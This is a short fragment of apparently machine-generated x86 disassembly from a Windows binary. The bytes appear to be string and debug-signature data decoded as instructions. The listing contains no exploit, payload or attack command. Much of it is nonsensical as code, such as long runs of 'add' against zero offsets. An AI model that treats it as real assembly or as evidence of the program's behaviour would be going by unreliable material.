  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	jle    0x433949
  43398f:	out    0x66,al
  433991:	or     DWORD PTR [edx+0x27],0x7c94b147
  433998:	or     ch,bh
  43399a:	xor    ebx,ebp
  43399c:	push   edx
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
